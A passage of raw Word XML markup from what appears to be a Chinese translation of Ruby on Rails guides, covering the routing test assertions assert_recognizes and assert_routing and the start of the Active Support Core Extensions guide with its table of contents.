          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> 断言</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47F0D0D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rPr>
        <w:t>assert_recognizes</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 是 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>assert_generates</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的反向断言. 它能够通过指定的位置判断是否与存在的路由规则匹配。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="1CFF3D86" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7C888911" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1317419037"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>assert_recognizes({ :controller</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "photos", :action</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "show", :id</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "1"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>}, "/photos/1")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="06E80A56" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">你可以提供一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:method</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 参数来指定使用的 HTTP 行为:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="703E688A" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0EE131C1" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1782873188"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>assert_recognizes({ :controller</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "photos", :action</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "create"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>}, { :path</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "photos", :method</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :post</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>})</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="253D7583" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">5.2.3 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>assert_routing</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> 断言</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41D1F456" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>assert_routing</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 对一个路由双向地进行测试: 它测试的一条路径是否与选项匹配，之后测试选项是否生成路径。因此，这条断言结合了前两个测试方法 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>assert_generates</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>assert_recognizes</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>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8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="016E490E" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2E97679A" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="538393759"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>assert_routing({ :path</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "photos", :method</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :post</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>}, { :controller</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "photos", :action</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "create"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>})</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7EF543D9" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRDefault="005D6D6E" w:rsidP="006E53E9"/>
    <w:p w14:paraId="2238CAA8" w14:textId="2DA49364" w:rsidR="005D6D6E" w:rsidRPr="005D6D6E" w:rsidRDefault="002B5D47" w:rsidP="005D6D6E">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:kern w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:kern w:val="0"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidR="002725A5">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:kern w:val="0"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="005D6D6E" w:rsidRPr="005D6D6E">
        <w:rPr>
          <w:kern w:val="0"/>
        </w:rPr>
        <w:t>深入</w:t>
      </w:r>
      <w:r w:rsidR="009012A1">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:kern w:val="0"/>
        </w:rPr>
        <w:t>研究</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77C3408E" w14:textId="177F05A5" w:rsidR="005D6D6E" w:rsidRDefault="002B5D47" w:rsidP="006E53E9">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>5.1、</w:t>
      </w:r>
      <w:hyperlink r:id="rId399" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="005D6D6E">
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Active Support Core Extensions</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="18908A43" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Active Support is the Ruby on Rails component responsible for providing Ruby language extensions, utilities, and other transversal stuff.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C14FDC9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>It offers a richer bottom-line at the language level, targeted both at the development of Rails applications, and at the development of Ruby on Rails itself.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C58F2DE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>By referring to this guide you will learn the extensions to the Ruby core classes and modules provided by Active Support.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B6A0964" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DF6F387" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId400" w:anchor="1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>How to Load Core Extensions</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="05E976B6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId401" w:anchor="1-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Stand-Alone Active Support</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="687BD08C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId402" w:anchor="1-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Active Support Within a Ruby on Rails Application</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="70FC800B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId403" w:anchor="2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Extensions to All Objects</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="21C9297F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId404" w:anchor="2-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>blank?</w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> and </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>present?</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3D49BE96" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId405" w:anchor="2-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>presence</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
